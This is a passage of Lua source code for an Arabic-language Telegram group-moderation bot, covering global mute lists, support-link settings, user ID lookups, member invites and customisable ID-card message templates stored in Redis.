text = "✟︙لا يوجد كلمات ممنوعه عام ،" 
end
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end end
 --     By Developer KASPER     --
 if text == ("المكتومين عام") and is_admin(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER..'bot:mutedall:')
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد مكتومين عام ،", "md")
end
mutedall = "✟︙قائمه الكتم عام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
mutedall = mutedall.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, mutedall, "md")
end end,nil) end end end 
--     By Developer KASPER     -- 
if text:match("^ضع دعم$") and KASPER11(msg) and is_sudo(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, "️✟︙ارسل لي رابط كروب الدعم \n✟︙او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله ", 1, "md")
KASPERdx1:setex(KASPER.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if is_sudo(msg) and (text:match("^حذف الدعم$")) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حذف معلومات الدعم ", 1, "md")
KASPERdx1:del(KASPER.."bot:supports:link")
end
--     By Developer KASPER     -- 
if text ==("كشف") or text ==("ايدي")  and msg.reply_to_message_id_ ~= 0 and KASPER11(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = result.sender_user_id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n✟︙عدد صوره ⌯» { '..pho.total_count_..' }'
end
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n✟︙عدد صوره ⌯» { '..pho.total_count_..' }'
end
if KASPERdx1:sismember(KASPER..'bot:gban:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif KASPERdx1:sismember(KASPER..'bot:mutedall:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif KASPERdx1:sismember(KASPER..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif KASPERdx1:sismember(KASPER..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif KASPERdx1:sismember(KASPER..'tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'مطرود'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then 
KASPERdx(msg.chat_id_, msg.id_, 1,'*✟︙الحساب محذوف*\n', 1, 'md')
return false  end
if data.username_ == false then
text = '✟︙ايديه ⌯»{ `'..result.sender_user_id_..
'` }\n✟︙رتبته بالكروب ⌯» { '..Renk..
' }\n✟︙رتبته بالبوت ⌯» { '..KASPER_renk(result.sender_user_id_, msg.chat_id_)..
' }\n'..photouser1..
'\n✟︙نوع القيود ⌯» { '..Tkeed..
' }\n✟︙التواجد ⌯» { '..tt..
' }\n✟︙نوع حسابه ⌯» { '..noh..' }'
monsend(msg,msg.chat_id_,text,data.id_) 
else
text = '✟︙ايديه ⌯»{ `'..result.sender_user_id_..
'` }\n✟︙معرفه ⌯» { [@'..data.username_..']'..
' } \n✟︙رتبته بالكروب ⌯» { '..Renk..
' }\n✟︙رتبته بالبوت ⌯» { '..KASPER_renk(result.sender_user_id_, msg.chat_id_)..
' }'..photouser1..
'\n✟︙نوع القيود ⌯» { '..Tkeed..
' }\n✟︙التواجد ⌯» { '..tt..
' }\n✟︙نوع حسابه ⌯» { '..noh..' }'
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end end,nil) end,nil) end,nil) end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
--     By Developer KASPER     -- 
if text and text:match('^ايدي @(.*)') and KASPER11(msg) then 
local username = text:match('^ايدي @(.*)') 
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
local text = '*✟︙المعرف غير صحيح*'
KASPERdx(msg.chat_id_, msg.id_, 1,text, 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '*✟︙نوع الحساب ⌯» { '..ch..' }\n✟︙الايدي ⌯» {*`'..res.id_..'`*}\n✟︙المعرف ⌯» {* [@'..username..'] *}\n✟︙الاسم ⌯» { *`'..res.title_..'`* }*'
KASPERdx(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '✟︙نوع الحساب ⌯» { '..gr..' }\n✟︙الايدي ⌯» {*`'..res.id_..'`*}\n✟︙المعرف ⌯» {* [@'..username..'] *}\n✟︙الاسم ⌯» { *`'..res.title_..'`* }*'
KASPERdx(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = res.id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = res.id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n✟︙عدد صوره ⌯» { '..pho.total_count_..' }'
end
if KASPERdx1:sismember(KASPER..'bot:gban:',res.id_) then
Tkeed = 'محظور عام'
elseif KASPERdx1:sismember(KASPER..'bot:mutedall:',res.id_) then
Tkeed = 'مكتوم عام'
elseif KASPERdx1:sismember(KASPER..'bot:banned:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif KASPERdx1:sismember(KASPER..'bot:muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif KASPERdx1:sismember(KASPER..'tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then
KASPERdx(msg.chat_id_, msg.id_, 1,'*✟︙الحساب محذوف*\n', 1, 'md')
return false  end
text = '✟︙ايديه ⌯»{ `'..res.id_..
'` }\n✟︙معرفه ⌯» { [@'..data.username_..']'..
' } \n✟︙رتبته بالكروب ⌯» { '..Renk..
' }\n✟︙رتبته بالبوت ⌯» { '..KASPER_renk(res.id_, msg.chat_id_)..
' }'..photouser1..
'\n✟︙نوع القيود ⌯» { '..Tkeed..
' }\n✟︙التواجد ⌯» { '..tt..
' }\n✟︙نوع حسابه ⌯» { '..noh..' }'
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end,nil) end,nil) end,nil) end end,nil)
return false 
end
--     By Developer KASPER     -- 
if text and text:match('ايدي (%d+)') and KASPER11(msg) then 
local iduser = text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = iduser},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = iduser,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
KASPERdx(msg.chat_id_, msg.id_, 1,'*✟︙لا يمكنني اتمام الامر *\n', 1, 'md')
return false  end
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n✟︙عدد صوره ⌯» { '..pho.total_count_..' }'
end
if pho.total_count_ == 0 then 
photouser1 = ''
else
photouser1 = '\n✟︙عدد صوره ⌯» { '..pho.total_count_..' }'
end
if KASPERdx1:sismember(KASPER..'bot:gban:',iduser) then
Tkeed = 'محظور عام'
elseif KASPERdx1:sismember(KASPER..'bot:mutedall:',iduser) then
Tkeed = 'مكتوم عام'
elseif KASPERdx1:sismember(KASPER..'bot:banned:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif KASPERdx1:sismember(KASPER..'bot:muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif KASPERdx1:sismember(KASPER..'tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then
KASPERdx(msg.chat_id_, msg.id_, 1,'*✟︙الحساب محذوف *\n', 1, 'md')
return false  end
if data.username_ == false then
text = '✟︙ايديه ⌯»{ `'..iduser..
'` }\n✟︙رتبته بالكروب ⌯» { '..Renk..
' }\n✟︙رتبته بالبوت ⌯» { '..KASPER_renk(iduser, msg.chat_id_)..
' }\n'..photouser1..
'\n✟︙نوع القيود ⌯» { '..Tkeed..
' }\n✟︙التواجد ⌯» { '..tt..
' }\n✟︙نوع حسابه ⌯» { '..noh..' }'
monsend(msg,msg.chat_id_,text,iduser) 
else
text = '✟︙ايديه ⌯»{ `'..iduser..
'` }\n✟︙معرفه ⌯» { [@'..data.username_..']'..
' }\n✟︙رتبته بالكروب ⌯» { '..Renk..
' }\n✟︙رتبته بالبوت ⌯» { '..KASPER_renk(iduser, msg.chat_id_)..
' }'..photouser1..
'\n✟︙نوع القيود ⌯» { '..Tkeed..
' }\n✟︙التواجد ⌯» { '..tt..
' }\n✟︙نوع حسابه ⌯» { '..noh..' }'
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end end,nil) end,nil) end,nil)
return false 
end
--     By Developer KASPER     -- 
local text = msg.content_.text_:gsub('اضافه','Invite')
if text:match("^[Ii]nvite$") and msg.reply_to_message_id_ ~= 0 then
function inv_reply(extra, result, success)
add_user(result.chat_id_, result.sender_user_id_, 5)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
end 
--     By Developer KASPER     -- 
if text:match("^[Ii]nvite @(.*)$") then
local ap = {string.match(text, "^([Ii]nvite) @(.*)$")}
function invite_by_username(extra, result, success)
if result.id_ then
add_user(msg.chat_id_, result.id_, 5)
else
if KASPERdx1:get(KASPER..'lang:gp:'..msg.chat_id_) then
texts = '✟︙User not found '
else
texts = '✟︙المعرف غير صحيح '
end
KASPERdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end end
resolve_username(ap[2],invite_by_username)
end end
--     By Developer KASPER     -- 
if text and text:match("^[Ii]nvite (%d+)$") then 
local ap = {string.match(text, "^([Ii]nvite) (%d+)$")}
add_user(msg.chat_id_, ap[2], 5)
end 
--     By Developer KASPER     -- 
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تغيير الايدي$") and KASPER11(msg) or text and text:match("^تغير الايدي$") and KASPER11(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑺𝑬𝑹 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
⌁︙𝐔𝐒𝐄𝐑 ↬ #username 
⌁︙𝐈𝐃 ↬ #id
⌁︙𝐒𝐓𝐀𝐒𝐓 ↬ #stast
⌁︙𝐀𝐔𝐓𝐎 ↬ #cont 
⌁︙𝐌𝐀𝐒𝐆 ↬ #msgs
⌁︙𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]]}
local Text_Rand = List[math.random(#List)]
KASPERdx1:set("KASPER:KASPER:id:text:"..bot_id..msg.chat_id_,Text_Rand)
local KASPER = '✟︙اهلا عزيزي  '..renk_KASPER(msg)..' \n✟︙تم تغيير كليشة الايدي ،\n✟︙ارسل الامر مره اخرى للتغيير مجددا ،'
KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md')
end
--     By Developer KASPER     -- 
if is_leader(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") and KASPER11(msg) or text and text:match("^تعيين ايدي عام$") and KASPER11(msg) or text and text:match("^تعيين الايدي عام$") and KASPER11(msg) then   
KASPERdx(msg.chat_id_, msg.id_, 1, ' \n✟︙لتعيين كليشه الايدي استخدم الدوال ادناه ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- #username  لطبع المعرف\n- #id  لطبع الايدي \n- #photos  لطبع عدد الصور \n- #stast لطبع الرتبه \n- #msgs  لطبع عدد الرسائل \n- #msgday  لطبع الرسائل اليوميه \n- #formsg  لطبع التفاعل \n- #game  لطبع عدد النقاط \n- #cont  لطبع عدد الجهات \n- #sticker  لطبع عدد الملصقات\n', 1, 'md')
KASPERdx1:set("KASPER:New:id:"..bot_id..msg.sender_user_id_,'KASPER')
return "KASPER"
end
if text and KASPERdx1:get("KASPER:New:id:"..bot_id..msg.sender_user_id_) then 
if text == 'الغاء' then   
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء حفظ كليشة الايدي ،', 1, 'md')
KASPERdx1:del("KASPER:New:id:"..bot_id..msg.sender_user_id_)
return false
end
KASPERdx1:del("KASPER:New:id:"..bot_id..msg.sender_user_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حفظ كليشة الايدي العامه ،', 1, 'md')
KASPERdx1:set("KASPER:KASPER:id:text:"..bot_id,text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
local KASPER = '✟︙اهلا عزيزي  '..renk_KASPER(msg)..' \n✟︙تم حذف كليشة الايدي العامه ،'
KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md')
KASPERdx1:del("KASPER:KASPER:id:text:"..bot_id)
end end
--     By Developer KASPER     -- 
if text and text:match("^تعيين الايدي$") and KASPER11(msg) or text and text:match("^تعين الايدي$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, ' \n✟︙لتعيين كليشه الايدي استخدم الدوال ادناه ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- #username  لطبع المعرف\n- #id  لطبع الايدي \n- #photos  لطبع عدد الصور \n- #stast لطبع الرتبه \n- #msgs  لطبع عدد الرسائل \n- #msgday  لطبع الرسائل اليوميه \n- #formsg  لطبع التفاعل \n- #game  لطبع عدد النقاط \n- #cont  لطبع عدد الجهات \n- #sticker  لطبع عدد الملصقات\n', 1, 'md')
KASPERdx1:set("KASPER:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'KASPER')
return "KASPER"
end
if text and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء حفظ كليشة الايدي ،', 1, 'md')
KASPERdx1:del("KASPER:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
return false
end
KASPERdx1:del("KASPER:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حفظ الكليشة الجديده ،', 1, 'md')
KASPERdx1:set("KASPER:KASPER:id:text:"..bot_id..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and KASPER11(msg) or text and text:match("^مسح الايدي$") and KASPER11(msg) then
local KASPER = '✟︙اهلا عزيزي  '..renk_KASPER(msg)..' \n✟︙تم حذف كليشة الايدي ،'
KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md')
KASPERdx1:del("KASPER:KASPER:id:text:"..bot_id..msg.chat_id_)
end end
--     By Developer KASPER     -- 
if msg.reply_to_message_id_ ~= 0 then
return ""
else 
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and KASPER11(msg) then
function KASPER(extra,result,success)
if result.username_ then username = '@'..result.username_ else username = ' لا يوجد 🎍 ' end
local function getpro(extra, result, success) 
local KASPER = KASPERdx1:get(KASPER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local KASPERy = (KASPERdx1:get('KASPER:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = KASPERdx1:get(KASPER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(KASPERdx1:get(KASPER.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local user_nkt = tonumber(KASPERdx1:get(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(KASPERdx1:get(KASPER..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(KASPERdx1:get(KASPER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
if result.photos_[0] then

if not KASPERdx1:get('KASPER:id:mute'..msg.chat_id_) then 
if not KASPERdx1:get('KASPER:id:photo'..msg.chat_id_) then
if KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id) then 
new_idii = KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id)
new_idii = new_idii:gsub('#username',(username or 'لا يوجد'))
new_idii = new_idii:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
new_idii = new_idii:gsub('#sticker',(sticker or 'لا يوجد'))
new_idii = new_idii:gsub('#game',(user_nkt or 'لا يوجد'))
new_idii = new_idii:gsub('#cont',(cont or 'لا يوجد'))
new_idii = new_idii:gsub('#msgs',(user_msgs + KASPERy  or 'لا يوجد'))
new_idii = new_idii:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
new_idii = new_idii:gsub('#msgday',(KASPER or 'لا يوجد'))
new_idii = new_idii:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
new_idii = new_idii:gsub('#stast',(KASPER_renk(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
else
new_idii = "\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..KASPER_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + KASPERy).." • "..(KASPER).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
end 
if not KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_idii,msg.id_,msg.id_.."")
else 

local new_id = KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs + KASPERy or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(KASPER_renk(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end else
if KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id) then 
new_ide = KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id)
new_ide = new_ide:gsub('#username',(username or 'لا يوجد'))
new_ide = new_ide:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
new_ide = new_ide:gsub('#sticker',(sticker or 'لا يوجد'))
new_ide = new_ide:gsub('#game',(user_nkt or 'لا يوجد'))
new_ide = new_ide:gsub('#cont',(cont or 'لا يوجد'))
new_ide = new_ide:gsub('#msgs',(user_msgs + KASPERy or 'لا يوجد'))
new_ide = new_ide:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
new_ide = new_ide:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
new_ide = new_ide:gsub('#stast',(KASPER_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
else
new_ide = "\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..KASPER_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + KASPERy).." • "..(KASPER).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
end
if not KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, new_ide, 1, 'html')
else
local new_id = KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs + KASPERy or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(KASPER_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
KASPERdx(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')
end end else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الايدي معطل  ', 1, 'md')
end else  

if KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id) then 
new_idii = KASPERdx1:get("KASPER:KASPER:id:text:"..bot_id)
new_idii = new_idii:gsub('#username',(username or 'لا يوجد'))
new_idii = new_idii:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
new_idii = new_idii:gsub('#sticker',(sticker or 'لا يوجد'))
new_idii = new_idii:gsub('#game',(user_nkt or 'لا يوجد'))
new_idii = new_idii:gsub('#cont',(cont or 'لا يوجد'))
new_idii = new_idii:gsub('#msgs',(user_msgs + KASPERy or 'لا يوجد'))
new_idii = new_idii:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
new_idii = new_idii:gsub('#msgday',(KASPER or 'لا يوجد'))
new_idii = new_idii:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
new_idii = new_idii:gsub('#stast',(KASPER_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
else
new_idii  = ".𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..KASPER_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + KASPERy).." • "..(KASPER).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
end
if not KASPERdx1:get('KASPER:id:mute'..msg.chat_id_) then 
if not KASPERdx1:get('KASPER:id:photo'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, new_idii, 1, 'html')
else
KASPERdx(msg.chat_id_, msg.id_, 1, ".𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..renk_forid.."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + KASPERy).." • "..(KASPER).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n", 1, 'md')
end else
